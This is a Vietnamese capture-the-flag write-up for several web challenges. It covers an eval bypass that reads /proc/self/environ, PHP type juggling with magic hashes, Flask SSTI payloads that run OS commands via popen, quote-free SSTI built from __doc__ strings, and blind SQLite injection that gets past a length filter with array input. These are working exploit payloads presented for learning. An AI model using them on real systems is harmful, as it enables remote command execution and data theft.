# EHC Đại Cương Tán Gái
Description: Khầy A đã mở 1 trang web để việc dạy học của mình trở nên hiệu quả hơn. Tuy vậy trang web có 1 bí mật đằng sau. Bạn có thể tìm ra nó?

Hint: Chỉ giải được bằng burpsuite, tìm cách biến request thành body.

Đọc source luôn của bài web này, mình thấy chỉ có 1 route duy nhất đó là `poem` và nó sẽ yêu cầu param `baitho` để lấy dữ liệu là bài thơ mà mình cần đọc.

![image](https://hackmd.io/_uploads/SyZ3la1M0.png)

1. Check robots.txt, mình có được cây thư mục dạng tree của bài này. Nếu mà nhìn sơ qua thì bài này có thể là 1 bài về vuln path traversal để mà đọc được file `phlag.txt` kia
![image](https://hackmd.io/_uploads/ByZubpJfR.png)


2. Nhưng ở đây, dữ liệu của chúng ta sẽ phải đi qua hàm `re.search` kia với regex `[^A-Za-z\.]`. Khá chặt khi chúng ta chỉ có thể sử dụng chữ cái và dấu chấm. 
3. Dữ liệu cuối cùng sẽ được đưa vào hàm eval, và đọc file với tên là data mà chúng ta cung cấp.

- Nếu mà bài này chỉ chặn các dấu slash thì mình sẽ sử dụng hàm `os.path.join` để đọc file `phlag.txt`
    - Ví dụ: `os.path.join("data", "file.txt")` sẽ được `data/file.txt`
- Nếu mà bài sử dụng hàm re.match, thì mình có thể bypass được regex này do search scope của 2 hàm là khác nhau. Hàm search sẽ search cả string mà ta truyền vào, còn hàm match chỉ là beggining của string. Theo đó, mình sẽ sử dụng các dấu xuống dòng để mà bypass hàm match. [Đọc thêm tại đây](https://www.secjuice.com/python-re-match-bypass-technique/)

Nhưng mà đối với bài này, 2 technique mình nghĩ được lại không sử dụng được. Theo wu của anh Thắng thì bài này sẽ sử dụng request. Khá sơ xuất khi lại bỏ qua nó. **Mình đã test thì chỉ có request.data mới sử dụng được, còn request.headers rồi thêm header vào request, hay là request.args rồi thêm 1 param vào url thì không có được.**

![image](https://hackmd.io/_uploads/rkCd461zC.png)

phlag ở khắp mọi nơi, điều đó có nghĩa là nó ở trong môi trường của bài này, khi đó sẽ nghĩ đến `/proc/self/environ`, nơi chứa các biến môi trường của process hiện tại đối với 1 máy nhân linux.

![image](https://hackmd.io/_uploads/HJqyUpJzA.png)

## PS: Về origin challenge của bài này
![image](https://hackmd.io/_uploads/ryXLU6kz0.png)

Đây là đoạn code đầy đủ của origin chall này với 2 lệnh with open file ở cuối. Khi đó, f sẽ bị cache và ta có thể đọc file flag.txt với biến f này.
![image](https://hackmd.io/_uploads/rJzp86kf0.png)

# Sanity Check

Source code của bài này
```
<?php 
include "flag.php"; 
highlight_file(__FILE__); 
error_reporting(0); 
$str1 = $_GET['ehc']; 

if(isset($_GET['ehc'])){ 
    if($str1 == md5($str1)){ 
        echo $flag1; 
    } 
    else{ 
        die(); 
    } 
} 
else{ 
    die();    
} 

$str2 = $_GET['1']; 
$str3 = $_GET['2']; 

if(isset($_GET['1']) && isset($_GET['2'])){ 
    if($str2 !== $str3){ 
        if(hash('md5', $salt . $str2) == hash('md5', $salt . $str3)){ 
            echo $flag2; 
        } 
        else{ 
            die(); 
        } 
    } 
    else{ 
        die(); 
    } 
} 
else{ 
    die();    
} 
?> 
```

Đây là 1 bài PHP Type Juggling điển hình. Mình có thể search payload trên PayloadAllOfTheThing. Hoặc là search google sẽ có writeup 1 bài giống y hệt bài này ở [đây](https://jaimelightfoot.com/blog/b00t2root-ctf-easyphp/).

PHP Type Juggling là gì? PHP là 1 loosely typed language, nghĩa là nó cố gắng dự đoán ý định của dev và tự động chuyển đổi các biến thành các kiểu khác nhau bất cứ khi nào thấy cần thiết. Ví dụ, 1 chuỗi chỉ chứa số có thể được coi là số nguyên hoặc số float. Tuy nhiên, việc chuyển đổi tự động này có thể dẫn đến kết quả không mong muốn, đặc biệt là khi so sánh các biến bằng toán tử `==`, toán tử này chỉ kiểm tra sự bằng nhau về giá trị (so sánh lỏng lẻo), chứ không kiểu tra sự bằng nhau về loại giá trị (so sánh nghiêm ngặt).

Về phần flag đầu tiên, ta có `($str1 == md5($str1))`. Ở đây ta có 1 magic hash.

- Nếu các hàm băm các chuỗi bắt đầu với 0e và theo sau chỉ là các số, PHP sẽ hiểu nó là ký tự khoa học và hàm băm được coi là số float trong các phép tính so sánh.

Khi đó, ta chỉ cần nhập payload `?ehc=0e215962017`, khi đó, giá trị chúng ta truyền vào tạo ra hash md5 là `0e291242476940776845150308577824`. Ở đây, PHP sẽ hiểu nó là 0 mũ ... -> luôn bằng 0. Ta sẽ có được mảnh flag đầu tiên. 

Về phần flag thứ 2 thú vị hơn nhiều. Nó so sánh 2 biến $str2 và $str3 chặt chẽ hơn với dấu !==, sau đó kiểm tra hash md5 của 2 chuỗi có bằng nhau không khi nối chúng vào sau 1 salt bất kỳ. 

Ở đây, ta sẽ truyền vào nó dạng array để bypass phần so sánh đầu tiên. Sau đó, điều thú vị của PHP đó chính là, **khi nối chuỗi với 1 array, PHP sẽ tự động chuyển array thành chuỗi "Array" và nối vào sau chuỗi đã cho.** 

![image](https://hackmd.io/_uploads/BkT190kf0.png)
Ví dụ trên, nó sẽ in ra chuỗi somethingArray.

Khi đó, payload cần nhập `?ehc=0e215962017&1[]=1&2[]=2`

![image](https://hackmd.io/_uploads/Hka8q01MR.png)


# EHC Pokemon

Đây là 1 challenge SSTI rõ ràng ở route sang pokemon kia, do giá trị `<pokemon>` mình có thể kiểm soát được và nó bị blacklist rồi đi đến hàm render_template_string kia - 1 hàm bị dính SSTI nếu không validate 1 cách chuẩn xác. 
![image](https://hackmd.io/_uploads/H1Rii1eGA.png)

Mình search payload SSTI với keyword "SSTI quote bypass" được như sau
`{{url_for.__globals__.os.popen(request.headers.hack).read()}}`

1. `url_for()`: Là 1 Flask method cho phép sửa đổi động các link dựa trên dữ liệu URL.
2. `__globals__`: Sử dụng globals để có thể truy cập đến os module, cái mà thuộc global scope.
3. `popen()`: Cho phép thực thi system command
4. `request.headers.name`: Lấy dữ liệu của 1 header bất kì
5. `read()`: Sử dụng để bắt và đọc output được tạo ra bởi popen() method.

![image](https://hackmd.io/_uploads/Bkk2aJlfC.png)

# EHC Etilos Crew
Khi đọc source thì mình thấy đây là 1 challenge SQLi, sử dụng db là SQLite3. Table chứa flag là random name như sau
![image](https://hackmd.io/_uploads/Byhr0ygfR.png)

Bài này sẽ có các loại filter như sau
![image](https://hackmd.io/_uploads/rkZY0JlM0.png)
1. Filter các keyword cơ bản kia
2. Check length xem có lớn hơn 6 không.

Chall này được viết bằng Javascript và không check input truyền vào có phải là string hay không, cho nên mình có thể truyền input vào dạng array.
Thêm nữa, Javascript xác định độ dài của một mảng là tổng số phần tử bên trong nó. Vì vậy, giờ ta có thể truyền vào payload dài tùy ý.

Check xem bypass length limit chưa
![image](https://hackmd.io/_uploads/Sky9xxezC.png)

Thành công bypass limit length. Tiếp theo, filter các keyword kia chưa bao gồm hết các keyword mà mình có thể sử dụng để lấy được flag hoặc tên bảng. 
Chú ý là filter có chặn từ substring hay substrs nhưng SQLite3 sử dụng hàm substr cơ, cho nên thoải mái sử dụng.

Payload để lấy tên bảng
`1' and substr((select group_concat(tbl_name) from sqlite_master),1,1) like 'x'-- -`

Loay hoay khá lâu với Burp Intruder, mình lấy được tên các bảng như sau

![image](https://hackmd.io/_uploads/r1YnDleGC.png)
Do là hàm group_concat nên nó sẽ trả về chuỗi là tên các bảng được nối lại với nhau. Bảng đầu tiên kia tên là api, còn bảng thứ 2 chính là bảng flag mà ta cần tìm. 
`flag_eaafb934_129a_4c65_b662_5cbda640bd0f`

Tiếp theo lấy từng kí tự của flag
`1' and substr((select flag from flag_eaafb934_129a_4c65_b662_5cbda640bd0f),1,1) like 'x'-- -`

![image](https://hackmd.io/_uploads/SkNxogefA.png)
Flag: EHCTF{I_th1nk_u_r_so_lite_UwU}




# EHC Waifu
Description: Chỉ khi bạn giải quyết secret `aUcoNnzcerplVJOgso6hf0KOP9w0aQeNlKEXeNSxcx3MkTfLpVXJRcZh1l6wl1zkjSdAYy5p/X/dhEKaH1ClYfHPCiOuIBunTT1sv+VdAlM=` thì bạn mới có thể tìm được waifu của mình. Waifu của tôi là `marin kitagawa`, tôi với cô ấy đã bên nhau 256 ngày, thật là một khoảng thời gian thật tuyệt vời. Hãy cẩn thận với những special character như _, nó có thể khiến phải đánh mất tình yêu của đời mình.

Đi đến đoạn SSTI của bài này luôn. Decrypt đoạn hash kia ta được `request|config|self|class|flag|0|1|2|3|4|5|6|7|8|9|\"|\'|\\|\~|\%|\#`. Đây chắc chắn là blacklist của SSTI rồi. 

Bài này cũng đã chặn hết tất cả các quote mà mình có thể sử dụng được. Nhìn sơ qua thì trông nó cũng không khác gì bài EHC Pokemon lắm nhưng mà đã chặn keyword request. 
Mình cũng có thử sử dụng dấu backticks để thay thế nhưng mà đều gặp lỗi 500 Internal Server Error.

Quote là điều rất cần thiết cho 1 payload SSTI nhưng ở đây đã chặn rồi? Vậy thì phải làm sao? Khi đó, Magic Method của Python sẽ giúp chúng ta giải quyết bài này. 

1. Ta sử dụng Magic Method `__doc__` để trả về các đoạn document của các hàm cơ bản.
> `[].__doc__`: Built-in mutable sequence.\n\nIf no argument is given, the constructor creates a new empty list.\nThe argument must be an iterable if specified. 
 
-  Nó trả về 1 string, đó là điều cần thiết để ta craft các payload SSTI.
2. Tiếp theo, sử dụng các Magic Method như `__len__`, `__name__` để trả về 1 số, từ đó chọn ra 1 kí tự mà ta cần trong đoạn string mà `__doc__` trả về.

## Craft Payload
Ở đây, giả sử chúng ta cần tạo ra chữ ls. 
- Tạo chữ l
    - ![image](https://hackmd.io/_uploads/Byyl3TeM0.png)
- Tạo chữ s
    - ![image](https://hackmd.io/_uploads/BJvBhpeMC.png)
- Dùng toán tử cộng để nối 2 string lại
    -> `().__doc__[[[],[],[]].__len__()]+().__str__.__name__[[[],[]].__len__()]`
    
Nói chung là khó khăn đoạn craft các chữ cái lại để tạo ra từ như ls hay cat /flag.txt, chứ payload tìm trên google rất nhiều.
![image](https://hackmd.io/_uploads/rksq2axG0.png)

Ta thấy có file flag trong working directory. 
Craft chữ flag
`[].__doc__[-[].clear.__name__.__len__()]` **: f**
`[].__doc__[[].pop.__name__.__len__()]` **: l**
`().__doc__[-[].__getitem__.__name__.__len__()]` **: a**
`{}.__new__.__doc__[-[].__init__.__name__.__len__()]` **: g**

![image](https://hackmd.io/_uploads/SycY6TgGA.png)

P/S: 
1. Nhớ URL-encode payload trước khi đưa vào Burp Suite nếu không sẽ bị 500 Internal Server Error. 
2. Craft dấu / sẽ nhọc hơn rất là nhiều đấy.